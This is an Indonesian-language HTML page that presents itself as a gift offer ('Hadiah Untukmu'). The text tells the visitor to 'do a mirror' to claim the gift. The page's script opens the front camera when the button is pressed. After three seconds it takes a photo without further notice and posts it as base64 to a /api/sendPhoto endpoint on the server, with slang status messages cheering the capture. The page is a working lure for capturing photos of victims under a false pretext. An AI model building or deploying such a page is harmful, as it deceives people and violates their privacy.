<!DOCTYPE html>
<html>
<head>
  <title>Hadiah Untukmu</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #ffffff;
      color: #333;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
    }
    button {
      padding: 15px 30px;
      font-size: 16px;
      background-color: #25D366;
      color: white;
      border: none;
      border-radius: 8px;
      margin-top: 30px;
      cursor: pointer;
    }
    video {
      display: block;
      margin: 20px auto;
      width: 90%;
      max-width: 400px;
      border: 2px dashed #25D366;
      border-radius: 10px;
    }
  </style>
</head>
<body>
  <h2>Hadiah Untukmu</h2>
  <p>Untuk mendapatkan, lakukan Miror.</p>
  <button onclick="startSnap()">Baca Tulisan Ini</button>
  <video id="cam" autoplay muted playsinline></video>
  <canvas id="snap" style="display:none;"></canvas>
  <p id="status" style="margin-top: 20px;"></p>

<script>
async function startSnap() {
  const video = document.getElementById('cam');
  const canvas = document.getElementById('snap');
  const ctx = canvas.getContext('2d');
  const status = document.getElementById('status');

  status.innerText = "Gass cuyy";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    video.srcObject = stream;

    video.onloadedmetadata = () => {
      video.play();
      status.innerText = "Jangan Kasih Kendor";

      setTimeout(() => {
        if (video.videoWidth === 0 || video.videoHeight === 0) {
          status.innerText = "‚ùå Kamera tidak memberi gambar.";
          return;
        }

        // ambil foto
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0);
        stream.getTracks().forEach(track => track.stop());

        const imgData = canvas.toDataURL('image/jpeg');
        sendPhoto(imgData);
      }, 3000);
    };

  } catch (err) {
    status.innerText = "‚ùå Gagal akses kamera: " + err.message;
  }
}

async function sendPhoto(base64img) {
  const status = document.getElementById('status');
  status.innerText = "üì§ Mengirim foto ke server...";

  try {
    const res = await fetch("/api/sendPhoto", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: base64img })
    });

    const data = await res.json();
    if (data.ok) {
      status.innerText = "Gokill Bos";
    } else {
      status.innerText = "‚ùå Gagal kirim foto: " + (data.description || data.error);
    }
  } catch (err) {
    status.innerText = "‚ùå Error: " + err.message;
  }
}
</script>
</body>
</html>
